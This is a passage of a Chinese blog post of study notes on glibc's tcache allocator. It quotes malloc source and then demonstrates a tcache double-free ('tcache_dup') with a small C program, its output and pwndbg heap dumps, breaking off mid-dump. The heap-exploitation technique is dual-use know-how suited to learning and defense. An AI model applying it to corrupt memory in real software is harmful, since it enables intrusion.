@@ -1,0 +1,609 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>Tcache Attack学习 | p1Kk&#39;s World!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="p1Kk">
+    
+
+    
+    <meta name="description" content="tcache机制tcache全名thread local caching，它为每个线程创建一个缓存（cache），从而实现无锁的分配算法，有不错的性能提升。lib-2.26【2.23以后】正式提供了该机制，并默认开启。 tcache的数据结构glibc在编译时使用use_tcache条件来开启tcache机制，定义了： 1234567891011121314151617181920212223#i">
+<meta name="keywords" content="pwn,堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tcache Attack学习">
+<meta property="og:url" content="p1Kk.github.io/2019/11/01/Tcache Attack学习/tcache/tcache/index.html">
+<meta property="og:site_name" content="p1Kk&#39;s World!">
+<meta property="og:description" content="tcache机制tcache全名thread local caching，它为每个线程创建一个缓存（cache），从而实现无锁的分配算法，有不错的性能提升。lib-2.26【2.23以后】正式提供了该机制，并默认开启。 tcache的数据结构glibc在编译时使用use_tcache条件来开启tcache机制，定义了： 1234567891011121314151617181920212223#i">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/11/01/yhFoAjx8NwTeKUc.png">
+<meta property="og:updated_time" content="2019-11-01T09:30:52.652Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Tcache Attack学习">
+<meta name="twitter:description" content="tcache机制tcache全名thread local caching，它为每个线程创建一个缓存（cache），从而实现无锁的分配算法，有不错的性能提升。lib-2.26【2.23以后】正式提供了该机制，并默认开启。 tcache的数据结构glibc在编译时使用use_tcache条件来开启tcache机制，定义了： 1234567891011121314151617181920212223#i">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/01/yhFoAjx8NwTeKUc.png">
+
+    
+    <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/site.jpg">
+    
+    
+    <link rel="apple-touch-icon" href="/img/head.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/head.png">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo2.jpg" alt="p1Kk&#39;s World!" title="p1Kk&#39;s World!"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="p1Kk&#39;s World!">p1Kk&#39;s World!</a></h1>
+				<h2 class="blog-motto">艺无止境，功不唐捐。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:p1Kk.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	
+	  <article itemprop="articleBody"> 
+		  <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/11/01/Tcache Attack学习/tcache/tcache/" title="Tcache Attack学习" itemprop="url">Tcache Attack学习</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
+		
+  <p class="article-time">
+    <time datetime="2019-11-01T09:31:01.933Z" itemprop="datePublished"> Published 2019-11-01</time>
+    
+  </p>
+</header>
+	  <div class="article-content">
+		  
+		  <div id="toc" class="toc-article">
+			  <strong class="toc-title">Contents</strong>
+		  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache机制"><span class="toc-number">1.</span> <span class="toc-text">tcache机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache的数据结构"><span class="toc-number">2.</span> <span class="toc-text">tcache的数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#触发在tcache中放入chunk的操作"><span class="toc-number">2.1.</span> <span class="toc-text">触发在tcache中放入chunk的操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#触发从tcache中取出chunk的操作"><span class="toc-number">2.2.</span> <span class="toc-text">触发从tcache中取出chunk的操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache的安全性"><span class="toc-number">3.</span> <span class="toc-text">tcache的安全性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-dup"><span class="toc-number">3.1.</span> <span class="toc-text">tcache_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">3.2.</span> <span class="toc-text">house of spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-overlapping-chunks"><span class="toc-number">3.3.</span> <span class="toc-text">tcache_overlapping_chunks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">3.4.</span> <span class="toc-text">tcache_poisoning</span></a></li></ol></li></ol>
+		  
+		  </div>
+		  
+		  <h1 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h1><p>tcache全名<em>thread local caching</em>，它为每个线程创建一个缓存（cache），从而实现无锁的分配算法，有不错的性能提升。lib-2.26【2.23以后】正式提供了该机制，并默认开启。</p>
+<h1 id="tcache的数据结构"><a href="#tcache的数据结构" class="headerlink" title="tcache的数据结构"></a>tcache的数据结构</h1><p>glibc在编译时使用<code>use_tcache</code>条件来开启tcache机制，定义了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="line"># define TCACHE_MAX_BINS        64      //每个线程默认使用64个单链表结构的bins</span><br><span class="line"># define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="line"></span><br><span class="line">/* Only used to pre-fill the tunables.  */</span><br><span class="line"># define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="line"></span><br><span class="line">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="line"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="line">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="line"># define usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="line"></span><br><span class="line">/* With rounding and alignment, the bins are...</span><br><span class="line">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="line">   idx 1   bytes 25..40 or 13..20</span><br><span class="line">   idx 2   bytes 41..56 or 21..28</span><br><span class="line">   etc.  */     //64位机器以16B递增，从24B到1032B，32位机器以8B递增，从12B到512B，因此tcache bin只用于存放non-large的chunk</span><br><span class="line"></span><br><span class="line">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="line">   tcache bin will hold at most this number of chunks.  */</span><br><span class="line"># define TCACHE_FILL_COUNT 7        //每个bins最多存放7个chunk</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+<p>新增了两个结构体<code>tcache_entry</code>和<code>tcache_pertheread_struct</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="line">   the chunk is stored in the per-thread cache.  */</span><br><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;        //每个被放入相应bins中的chunk都会在其用户数据中包含一个tcache_entry(FD指针)。指向同bins中的下一个chunk，构成单链表</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line">/* There is one of these for each thread, which contains the</span><br><span class="line">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="line">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="line">   are redundant (we could have just counted the linked list each</span><br><span class="line">   time), this is for performance reasons.  */</span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];     //数组counts用于存放每个bins中的chunk数量</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];   //数组entries用于放置64个bins</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure>
+
+<h2 id="触发在tcache中放入chunk的操作"><a href="#触发在tcache中放入chunk的操作" class="headerlink" title="触发在tcache中放入chunk的操作"></a>触发在tcache中放入chunk的操作</h2><ul>
+<li><p>free时，在fastbin操作之前进行，如果chunk size符合要求，并且对应的bins还没有装满，则将其放入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> #if USE_TCACHE</span><br><span class="line">&#123;</span><br><span class="line">  size_t tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">  if (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line">return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>malloc时</p>
+</li>
+<li><ul>
+<li>如果从fastbin中成功返回了一个需要的chunk，那么<strong>对应fastbin中的其他chunk</strong>会被放进相应的tcache bin中，直到上限。需要注意的是，chunks在tcache bin的顺序和在fastbin中的顺序是反过来的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">        /* While we&apos;re here, if we see other chunks of the same size,</span><br><span class="line">       stash them in the tcache.  */</span><br><span class="line">        size_t tc_idx = csize2tidx (nb);</span><br><span class="line">        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">        while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            if (SINGLE_THREAD_P)</span><br><span class="line">          *fb = tc_victim-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">          &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            if (__glibc_unlikely (tc_victim == NULL))</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">            tcache_put (tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><ul>
+<li>smallbin中的情况与fastbin相似，双链表中剩余的chunk会被填充到tcache bin中，直到上限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">    /* While we&apos;re here, if we see other chunks of the same size,</span><br><span class="line">       stash them in the tcache.  */</span><br><span class="line">    size_t tc_idx = csize2tidx (nb);</span><br><span class="line">    if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">        while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        if (tc_victim != 0)</span><br><span class="line">          &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">            if (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena (tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put (tc_victim, tc_idx);</span><br><span class="line">              &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><ul>
+<li>binning code（chunk合并等其他情况）中，每个符合要求的chunk都会优先被放入tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache会返回其中一个。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">        /* Fill cache first, return to user only if cache fills.</span><br><span class="line">       We may return one of these chunks later.  */</span><br><span class="line">        if (tcache_nb</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (victim, tc_idx);</span><br><span class="line">        return_cached = 1;</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">        else</span><br><span class="line">      &#123;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="触发从tcache中取出chunk的操作"><a href="#触发从tcache中取出chunk的操作" class="headerlink" title="触发从tcache中取出chunk的操作"></a>触发从tcache中取出chunk的操作</h2><ul>
+<li><p>在<code>__libc_malloc()</code>调用<code>_int_malloc()</code>之前，如果tcache bin中有符合要求的chunk，则直接将他返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">  size_t tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>bining code 中，如果在 tcache 中放入 chunk 达到上限，则会直接返回最后一个chunk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">    /* If we&apos;ve processed as many chunks as we&apos;re allowed while</span><br><span class="line">   filling the cache, return one of the cached ones.  */</span><br><span class="line">    ++tcache_unsorted_count;</span><br><span class="line">    if (return_cached</span><br><span class="line">    &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</span><br><span class="line">    &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">  &#123;</span><br><span class="line">    return tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>当然默认情况下没有限制，所以这段代码也不会执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.tcache_unsorted_limit = 0 /* No limit.  */</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>binning code 结束后，如果没有直接返回（如上），那么如果有至少一个符合要求的 chunk 被找到，则返回最后一个。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">      /* If all the small chunks we found ended up cached, return one now.  */</span><br><span class="line">      if (return_cached)</span><br><span class="line">  &#123;</span><br><span class="line">    return tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong>tcache 中的 chunk 不会被合并，无论是相邻 chunk，还是 chunk 和 top chunk。因为这些 chunk 会被标记为 inuse。</strong></p>
+<h1 id="tcache的安全性"><a href="#tcache的安全性" class="headerlink" title="tcache的安全性"></a>tcache的安全性</h1><p>上面提到的放入chunk<code>tcache_put()</code>和取出chunk<code>tcache_get()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&apos;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Caller must ensure that we know tc_idx is valid and there&apos;s</span><br><span class="line">   available chunks to remove.  */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);        //只检查了tc_idx</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对tcache的操作在free和malloc中往往都处于很靠前的位置，导致原来的许多有效性检查都被无视了。所以存在安全隐患。</p>
+<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    void *p1 = malloc(0x10);</span><br><span class="line">    fprintf(stderr, &quot;1st malloc(0x10): %p\n&quot;, p1);</span><br><span class="line">    fprintf(stderr, &quot;Freeing the first one\n&quot;);</span><br><span class="line">    free(p1);</span><br><span class="line">    fprintf(stderr, &quot;Freeing the first one again\n&quot;);</span><br><span class="line">    free(p1);</span><br><span class="line">    fprintf(stderr, &quot;2nd malloc(0x10): %p\n&quot;, malloc(0x10));</span><br><span class="line">    fprintf(stderr, &quot;3rd malloc(0x10): %p\n&quot;, malloc(0x10));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1st malloc(0x10): 0x5561ddcc4260</span><br><span class="line">Freeing the first one</span><br><span class="line">Freeing the first one again     //double free惹</span><br><span class="line">2nd malloc(0x10): 0x5561ddcc4260</span><br><span class="line">3rd malloc(0x10): 0x5561ddcc4260</span><br></pre></td></tr></table></figure>
+
+<p>gdb调试：<br>第一次malloc后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>第一次free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap heap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000001	0x0000000000000000      ==&gt; counts = 1  //一开始是什么都没有的</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000555555756260	0x0000000000000000      ==&gt; entries</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>第二次free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000555555756260	0x0000000000000000      ==&gt;double freed</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000002	0x0000000000000000      ==&gt; counts = 2</span><br><span class="line">0x555555756020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756050:	0x0000555555756260	0x0000000000000000</span><br><span class="line">0x555555756060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>再一次malloc后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555756250</span><br><span class="line">0x555555756250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555555756260:	0x0000555555756260	0x0000000000000000</span><br><span class="line">0x555555756270:	0x0000000000000000	0x0000000000020d91</span><br><span class="line">0x555555756280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756290:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/16gx 0x555555756000</span><br><span class="line">0x555555756000:	0x0000000000000000	0x0000000000000251</span><br><span class="line">0x555555756010:	0x0000000000000001	0x0000000000000000      ==&gt; counts = 1</span><br><span 